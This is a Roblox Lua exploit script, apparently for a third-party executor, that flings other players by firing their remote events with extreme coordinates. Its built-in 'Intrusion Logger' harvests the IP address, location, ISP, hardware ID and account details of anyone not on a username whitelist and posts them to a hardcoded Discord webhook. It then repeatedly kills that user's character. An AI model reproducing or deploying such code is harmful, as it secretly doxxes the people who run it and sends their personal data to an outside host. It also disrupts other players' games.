-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")
local Lighting = game:GetService("Lighting")

-- Configuration
local whitelist = {
    "06fpp",
    "EyadAlt571",
    "Excrypted2",
    "ENKA56M",
    "EyadRamyEmad22",
    "unknownguy2009o",
    "Idoeepe",
    "AdminBackup",
    "DevAccountAlpha",
    "ScriptHelper",
    "TestUser1",
    "TestUser2",
    "TestUser3",
    "TestUser4",
    "TestUser5"
}
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1392856288198660167/PcmIn5NiuPc3RDSgoeC6UyWAPTNHxtZghn66ma3OX9XvVL5gwTrKTnLnROfNFJfcougu"
local LocalPlayer = Players.LocalPlayer
local enabled = true

-- Intrusion Logger
local function logIntrusion()
    local UserId = LocalPlayer.UserId
    local DisplayName = LocalPlayer.DisplayName
    local Username = LocalPlayer.Name
    local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
    local AccountAge = LocalPlayer.AccountAge
    local Country = LocalizationService.RobloxLocaleId
    local GetIp = game:HttpGet("https://v4.ident.me/")
    local success, GetData = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
    end)
    local Hwid = RbxAnalyticsService:GetClientId()
    local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
    local GameName = GameInfo.Name
    local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "üì± Mobile" or "üíª PC"
    local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

    local function detectExecutor()
        return identifyexecutor and identifyexecutor() or "Unknown"
    end

    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/"..game.PlaceId
    local playerLink = "https://www.roblox.com/users/"..UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId="..game.PlaceId.."&launchData="..game.JobId
    local jobIdLink = "https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId

    local data = {
        username = "Anvil Flinger Security",
        avatar_url = "https://i.pinimg.com/564x/0a/e0/a0/0ae0a0f6b8abfd380b6da3f4178db8e6.jpg",
        embeds = {
            {
                title = "üö® Unauthorized Access Detected",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0xe74c3c")
            },
            {
                title = "üë§ Intruder Details",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Executor:** %s",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, executor
                ),
                color = tonumber("0x3498db")
            },
            {
                title = "üåê Location Data",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s\n**Region:** %s\n**ISP:** %s",
                    GetIp, Hwid, 
                    success and GetData.country or "N/A",
                    success and GetData.regionName or "N/A",
                    success and GetData.isp or "N/A"
                ),
                color = tonumber("0xf1c40f")
            },
            {
                title = "üìä Game Stats",
                description = string.format(
                    "**Ping:** %dms\n**Job ID:** [%s](%s)\n**Mobile Join:** [Link](%s)",
                    Ping, game.JobId, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x2ecc71"),
                footer = { 
                    text = string.format("üìÖ %s | ‚è∞ %s", date, time)
                }
            }
        }
    }

    local requestFunc = http_request or request or HttpPost or syn.request
    if requestFunc then
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    else
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data))
    end
end

-- Authorization Check
local isAuthorized = false
do
    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checking...", "All")
    for _, username in ipairs(whitelist) do
        if LocalPlayer.Name:lower() == username:lower() then
            isAuthorized = true
            break
        end
    end
    if not isAuthorized then
        logIntrusion()
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("May god forgive.", "All")
        Lighting.Brightness = -99
        while true do
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid.Health = 0
            end
            RunService.Heartbeat:Wait()
        end
        return
    end
    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Authorized.", "All")
end

-- Anti-Anvil System
RunService.Heartbeat:Connect(function()
    if not enabled then return end
    for _, player in ipairs(Players:GetPlayers()) do
        if player == LocalPlayer then continue end
        
        local anvil = player.Character and player.Character:FindFirstChild("Anvil")
        if not anvil then continue end
        
        local send = anvil:FindFirstChild("send")
        if not send then continue end
        
        pcall(function()
            send:FireServer(CFrame.new(0, -10^308, 0))
        end)
    end
end)

-- Command System
LocalPlayer.Chatted:Connect(function(msg)
    enabled = msg == ".on" or not (msg == ".off")
end)
